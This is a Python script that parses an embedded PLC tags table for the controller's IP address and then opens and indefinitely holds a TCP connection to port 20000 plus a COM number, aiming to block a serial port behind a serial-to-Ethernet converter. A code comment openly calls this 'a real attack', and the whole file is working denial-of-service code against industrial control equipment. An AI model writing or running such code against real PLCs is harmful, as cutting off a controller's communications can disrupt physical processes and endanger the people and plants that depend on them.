import socket
import time
import re

def get_plc_ip_address(tags_table_text):
    """
    Extracts the PLC's IP address from the provided tags table text.

    Args:
        tags_table_text: The text containing the PLC's tags table.

    Returns:
        The PLC's IP address as a string, or None if not found.
    """
    try:
        ip_address_pattern = r"IP Address:\s*(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})"
        match = re.search(ip_address_pattern, tags_table_text)
        if match:
            return match.group(1)
        else:
            return None
    except Exception as e:
        print(f"Error extracting IP address: {e}")
        return None

def block_serial_com(plc_ip, com_port):
    """
    Blocks access to a serial COM port by holding open a TCP connection.

    Args:
        plc_ip: The IP address of the PLC or serial-to-Ethernet converter.
        com_port: The COM port number to block (e.g., 1 for COM1).
    """

    port = 20000 + com_port  # Serial to Ethernet converters often use port 20000 + COM port number.
    print(f"Attempting to block COM{com_port} by connecting to {plc_ip}:{port}")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((plc_ip, port))
        print(f"Successfully connected to {plc_ip}:{port}. Holding connection...")

        # Keep the connection open indefinitely.  In a real attack, you'd likely
        # want to run this in a separate thread or process so it doesn't block
        # other operations.  We include a KeyboardInterrupt handler for easy
        # termination.
        try:
            while True:
                time.sleep(60)  # Keep the connection alive by sleeping
        except KeyboardInterrupt:
            print("Interrupted. Closing connection...")
        finally:
            s.close()
            print("Connection closed.")

    except socket.error as e:
        print(f"Error connecting to {plc_ip}:{port}: {e}")


# Main execution block
if __name__ == "__main__":
    # Replace with your actual tags table data. This is crucial to get the script to work as intended in all circumstances.
    tags_table_data = """
PLC Tags and References Table
Digital Inputs (%I)
Address  Usage      Configuration  Notes
%I0.0    Used       No Filter      Connected to HSC0 as Pulse Input
%I0.1    Not Used   3ms Filter
%I0.2    Not Used   3ms Filter     Available for FC0
%I0.3    Not Used   3ms Filter     Available for FC1
%I0.4    Not Used   3ms Filter     Available for FC2
%I0.5    Not Used   3ms Filter
%I0.6    Not Used   3ms Filter
%I0.7    Not Used   3ms Filter
%I0.8    Not Used   3ms Filter
Digital Outputs (%Q)
Address  Symbol     Description         Used By     Fallback
%Q0.0    Q_FAN     Fan Control         User Logic  0
%Q0.1    -         -                   -           0
%Q0.2    -         -                   -           0
%Q0.3    -         -                   -           0
%Q0.4    Q_REDA    Fan A Red LED       User Logic  0
%Q0.5    Q_GREENA  Fan A Green LED     User Logic  0
%Q0.6    -         -                   -           0
Memory Bits (%M)
Address  Symbol     Description     Usage
%M1      M_ACTFAN   Activate Fan A  Used in Rung0 and Rung1
%M2      M_TOG      Toggle Off      Used in Rung1
System Bits (%S)
Address  Symbol    Description                   Usage
%S6      SB_TB1S   1 Second Time Base           Rung0
Timers (%TM)
Address  Type  Time Base  Preset  Retentive
%TM0     TP    1s         20       No
%TM1     TON   1s         20       No
Counters (%C)
Address  Preset  Usage
%C0      15      Rung0
Analog Inputs (%IW)
Address  Type     Range    Configuration
%IW0.0   0-10 V   0-1000   Normal
%IW0.1   0-10 V   0-1000   Normal
High Speed Counter (HSC)
Address  Type           Configuration      Input
%HSC0    Single Phase   Free-large        %I0.0
%HSC1    Not Configured -                 -
%HSC2    Not Configured -                 -
%HSC3    Not Configured -                 -
Network Configuration
IP Address: 192.168.9.24
Subnet Mask: 255.255.255.0
Gateway: 0.0.0.0
Protocols Enabled:
Modbus Server
EtherNet/IP
Programming Protocol
Serial Line (SL1)
Protocol: Modbus RTU
Mode: Slave
Address: 1
Baud Rate: 19200
Parity: Even
Data Bits: 8
Stop Bits: 1
Physical Medium: RS-485
"""

    plc_ip = get_plc_ip_address(tags_table_data)

    if plc_ip:
        print(f"PLC IP Address: {plc_ip}")
        com_port_to_block = 1  # Block COM1 by default
        block_serial_com(plc_ip, com_port_to_block)
    else:
        print("Could not extract PLC IP address from tags table.  Please ensure the tags_table_data variable contains the correct information.")